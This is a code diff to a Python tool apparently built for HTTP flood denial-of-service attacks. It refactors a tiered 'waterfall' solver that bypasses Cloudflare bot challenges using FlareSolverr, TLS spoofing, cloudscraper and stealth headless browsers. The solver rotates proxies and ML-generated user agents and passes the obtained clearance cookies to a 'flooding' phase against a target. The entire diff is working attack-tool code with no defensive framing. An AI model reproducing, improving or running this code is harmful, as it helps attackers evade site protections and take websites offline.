-            from concurrent.futures import ThreadPoolExecutor, as_completed
-            _results = {"t0": (None, None), "t1": (None, None)}
-            def _run_tier0():
+            import asyncio
+            async def _run_tier0_async():
                 try:
                     # Minimal FlareSolverr request (no retry in parallel path to avoid double-sleep)
                     import urllib.request as _ureq, json as _json
                     timeout_ms = timeout if timeout > 1000 else timeout * 1000
-                    _payload = json.dumps({"cmd": "request.get", "url": url, "maxTimeout": timeout_ms}).encode("utf-8")
+                    _payload = _json.dumps({"cmd": "request.get", "url": url, "maxTimeout": timeout_ms}).encode("utf-8")
                     _req = _ureq.Request(
                         ENGINE_STATE.flaresolverr_url, data=_payload, headers={"Content-Type": "application/json"}
                     )
-                    with _ureq.urlopen(_req, timeout=(timeout_ms / 1000.0) + 5) as resp:
-                        _rd = _json.loads(resp.read().decode("utf-8"))
-                        if _rd.get("status") == "ok" and _rd.get("solution"):
-                            _sol = _rd["solution"]
-                            _cookies = _sol.get("cookies", [])
-                            if _cookies and any(c.get("name") == "cf_clearance" for c in _cookies):
-                                _cs = "; ".join([f"{c['name']}={c['value']}" for c in _cookies if "name" in c])
-                                return _cs, _sol.get("userAgent", user_agent)
+                    # We wrap urlopen in to_thread because it's synchronous IO
+                    def fetch():
+                        with _ureq.urlopen(_req, timeout=(timeout_ms / 1000.0) + 5) as resp:
+                            return _json.loads(resp.read().decode("utf-8"))
+                    
+                    _rd = await asyncio.to_thread(fetch)
+                    if _rd.get("status") == "ok" and _rd.get("solution"):
+                        _sol = _rd["solution"]
+                        _cookies = _sol.get("cookies", [])
+                        if _cookies and any(c.get("name") == "cf_clearance" for c in _cookies):
+                            _cs = "; ".join([f"{c['name']}={c['value']}" for c in _cookies if "name" in c])
+                            return _cs, _sol.get("userAgent", user_agent)
                 except Exception:
                     pass
                 return None, None
-            def _run_tier1():
-                return BrowserEngine._solve_tier1_lightweight(url, proxy, user_agent, 10)
-            with ThreadPoolExecutor(max_workers=2) as pool:
-                _f0 = pool.submit(_run_tier0)
-                _f1 = pool.submit(_run_tier1)
-                for _f in as_completed((_f0, _f1)):
-                    _c, _u = _f.result()
+            
+            async def _run_tier1_async():
+                return await BrowserEngine._solve_tier1_lightweight(url, proxy, user_agent, 10)
+                
+            done, pending = await asyncio.wait(
+                [asyncio.create_task(_run_tier0_async()), asyncio.create_task(_run_tier1_async())],
+                return_when=asyncio.FIRST_COMPLETED
+            )
+            
+            for task in done:
+                _c, _u = task.result()
+                if _c:
+                    logger.info(f"{bcolors.OKGREEN}[*] Parallel Probe: Solved!{bcolors.RESET}")
+                    for p in pending:
+                        p.cancel()
+                    if proxy:
+                        _pcb.failures.pop(proxy, None)  # Reset failure count on success
+                    return _c, _u
+            # If the first one failed, wait for the second one
+            if pending:
+                done2, _ = await asyncio.wait(pending)
+                for task in done2:
+                    _c, _u = task.result()
                     if _c:
                         logger.info(f"{bcolors.OKGREEN}[*] Parallel Probe: Solved!{bcolors.RESET}")
-                        pool.shutdown(wait=False, cancel_futures=True)
                         if proxy:
-                            _pcb.failures.pop(proxy, None)  # Reset failure count on success
+                            _pcb.failures.pop(proxy, None)
                         return _c, _u
             # Both parallel probes failed — proceed to sequential waterfall below
 
@@ -2686,7 +2821,7 @@ class BrowserEngine:
                 try:
                     import urllib.request
                     import json
-                    import time
+                    import asyncio
                     timeout_ms = timeout if timeout > 1000 else timeout * 1000
                     payload_data = {
                         "cmd": "request.get",
@@ -2705,25 +2840,30 @@ class BrowserEngine:
                         data=payload,
                         headers={"Content-Type": "application/json"}
                     )
-                    with urllib.request.urlopen(req, timeout=(timeout_ms / 1000.0) + 5) as resp:
-                        resp_data = json.loads(resp.read().decode("utf-8"))
-                        if resp_data.get("status") == "ok" and resp_data.get("solution"):
-                            sol = resp_data["solution"]
-                            cookies = sol.get("cookies", [])
-                            ua = sol.get("userAgent", user_agent)
-                            if cookies:
-                                cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies if "name" in c and "value" in c])
-                                cf_present = any(c.get("name") == "cf_clearance" for c in cookies)
-                                if cf_present or resp_data.get("status") == "ok":
-                                    logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 0!{bcolors.RESET}")
-                                    HttpFlood._active_solver = "Tier 0 (FlareSolverr)"
-                                    return cookie_str, ua
+                    
+                    def fetch():
+                        with urllib.request.urlopen(req, timeout=(timeout_ms / 1000.0) + 5) as resp:
+                            return json.loads(resp.read().decode("utf-8"))
+                            
+                    resp_data = await asyncio.to_thread(fetch)
+                    if resp_data.get("status") == "ok" and resp_data.get("solution"):
+                        sol = resp_data["solution"]
+                        cookies = sol.get("cookies", [])
+                        ua = sol.get("userAgent", user_agent)
+                        if cookies:
+                            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies if "name" in c and "value" in c])
+                            cf_present = any(c.get("name") == "cf_clearance" for c in cookies)
+                            if cf_present or resp_data.get("status") == "ok":
+                                logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 0!{bcolors.RESET}")
+                                HttpFlood._active_solver = "Tier 0 (FlareSolverr)"
+                                return cookie_str, ua
                     break
                 except Exception as e:
                     is_http_500 = (hasattr(e, "code") and getattr(e, "code") == 500) or "500" in str(e)
                     if attempt == 0 and is_http_500:
                         logger.warning(f"{bcolors.WARNING}[!] Tier 0 FlareSolverr HTTP 500 (browser cleanup in progress), retrying in 2.5s...{bcolors.RESET}")
-                        time.sleep(2.5)
+                        import asyncio
+                        await asyncio.sleep(2.5)
                         continue
                     logger.warning(f"[!] Tier 0 FlareSolverr failed: {e}. Falling back to Tier 1.")
                     break
@@ -2731,7 +2871,8 @@ class BrowserEngine:
 
         # Tier 1a: curl_cffi (Spoofs TLS)
         logger.info(f"{bcolors.OKCYAN}[*] Executing Tier 1a (curl_cffi)...{bcolors.RESET}")
-        cookie, ua = BrowserEngine._solve_tier1_lightweight(url, proxy, user_agent, 10)
+        import asyncio
+        cookie, ua = await BrowserEngine._solve_tier1_lightweight(url, proxy, user_agent, 10)
         if cookie:
             logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 1a!{bcolors.RESET}")
             HttpFlood._active_solver = "Tier 1a (curl_cffi)"
@@ -2739,7 +2880,7 @@ class BrowserEngine:
 
         # Tier 1b: cloudscraper (Spoofs JS challenge)
         logger.info(f"{bcolors.WARNING}[!] Tier 1a failed. Executing Tier 1b (Cloudscraper)...{bcolors.RESET}")
-        cookie, ua = BrowserEngine._solve_tier1a_cloudscraper(url, proxy, user_agent, 15)
+        cookie, ua = await BrowserEngine._solve_tier1a_cloudscraper(url, proxy, user_agent, 15)
         if cookie:
             logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 1b!{bcolors.RESET}")
             HttpFlood._active_solver = "Tier 1b (Cloudscraper)"
@@ -2747,7 +2888,7 @@ class BrowserEngine:
 
         # Tier 2: Fast Headless CDP
         logger.info(f"{bcolors.WARNING}[!] Tier 1b failed. Executing Tier 2 (Fast CDP)...{bcolors.RESET}")
-        cookie, ua = BrowserEngine._solve_tier2_fast_cdp(url, proxy, user_agent, 15)
+        cookie, ua = await BrowserEngine._solve_tier2_fast_cdp(url, proxy, user_agent, 15)
         if cookie:
             logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 2!{bcolors.RESET}")
             HttpFlood._active_solver = "Tier 2"
@@ -2755,7 +2896,7 @@ class BrowserEngine:
             
         # Tier 3: Heavy Stealth Chromium
         logger.info(f"{bcolors.WARNING}[!] Tier 2 failed. Executing Tier 3 (Heavy Stealth)...{bcolors.RESET}")
-        cookie, ua = BrowserEngine._solve_tier3_heavy_stealth(url, proxy, user_agent, 30)
+        cookie, ua = await BrowserEngine._solve_tier3_heavy_stealth(url, proxy, user_agent, 30)
         if cookie:
             logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 3!{bcolors.RESET}")
             HttpFlood._active_solver = "Tier 3"
@@ -2763,7 +2904,7 @@ class BrowserEngine:
 
         # Tier 4: Ultimate Stealth Firefox
         logger.info(f"{bcolors.WARNING}[!] Tier 3 failed. Executing Tier 4 (Ultimate Stealth)...{bcolors.RESET}")
-        cookie, ua = BrowserEngine._solve_tier4_ultimate_stealth(url, proxy, user_agent, 45)
+        cookie, ua = await BrowserEngine._solve_tier4_ultimate_stealth(url, proxy, user_agent, 45)
         if cookie:
             logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 4!{bcolors.RESET}")
             HttpFlood._active_solver = "Tier 4"
@@ -3580,7 +3721,7 @@ class HttpFlood:
                         proxy_str = str(pro) if pro else None
                         ua_target = ML_ENGINE.get_fingerprint()["ua"]
                         
-                        cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, str(self._target), proxy=proxy_str, user_agent=ua_target)
+                        cookie, ua = await BrowserEngine.solve_cf(str(self._target), proxy=proxy_str, user_agent=ua_target)
                         HttpFlood._solve_phase = "flooding" if cookie else "idle"
                         
                         if cookie == "proxy_error":
@@ -4265,14 +4406,14 @@ class HttpFlood:
                                 proxy_str = str(candidate)
                     # Try with latest ML User-Agent
                     ua_target = ML_ENGINE.get_fingerprint()["ua"]
-                    cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, str(self._target), proxy=proxy_str, user_agent=ua_target)
+                    cookie, ua = await BrowserEngine.solve_cf(str(self._target), proxy=proxy_str, user_agent=ua_target)
                     
                     used_proxy = proxy_str
                     if not cookie and proxy_str:
                         logger.warning(f"{bcolors.WARNING}[!] CFBUAM: Solve failed with proxy. Retrying without proxy...{bcolors.RESET}")
                         await HttpFlood._circuit_breaker.register_failure(proxy_str)
                         used_proxy = None
-                        cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, str(self._target), user_agent=ua_target)
+                        cookie, ua = await BrowserEngine.solve_cf(str(self._target), user_agent=ua_target)
 
                     if cookie == "proxy_error":
                         if proxy_str:
@@ -4867,7 +5008,7 @@ class HttpFlood:
                 ua_target = ML_ENGINE.get_fingerprint()["ua"]
                 
                 try:
-                    cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, str(self._target), proxy=proxy_str, user_agent=ua_target)
+                    cookie, ua = await BrowserEngine.solve_cf(str(self._target), proxy=proxy_str, user_agent=ua_target)
                     if cookie == "proxy_error":
                         HttpFlood._cfbuam_cookie = None
                         HttpFlood._last_solve_attempt = 0
@@ -5866,7 +6007,7 @@ async def main_async():
                             ua_target = ML_ENGINE.get_fingerprint()["ua"]
                             
                             # Run solver in thread to not block flood
-                            cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, target_host, proxy=proxy_str, user_agent=ua_target)
+                            cookie, ua = await BrowserEngine.solve_cf(target_host, proxy=proxy_str, user_agent=ua_target)
                             
                             if cookie and cookie != "_yummy=choco":
                                 HttpFlood._cfbuam_cookie = cookie # Double-buffer is essentially instant swap
@@ -6080,7 +6221,7 @@ async def _cfb_worker_task(target: str, stop_event: asyncio.Event) -> None:
 
 async def _run_waterfall_bypass(target_url: str) -> str | None:
     """Run the waterfall bypass Cascade and return the token."""
-    cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, target_url)
+    cookie, ua = await BrowserEngine.solve_cf(target_url)
     return cookie
 
 async def _trigger_bypass_re_solve(target_url: str) -> None:
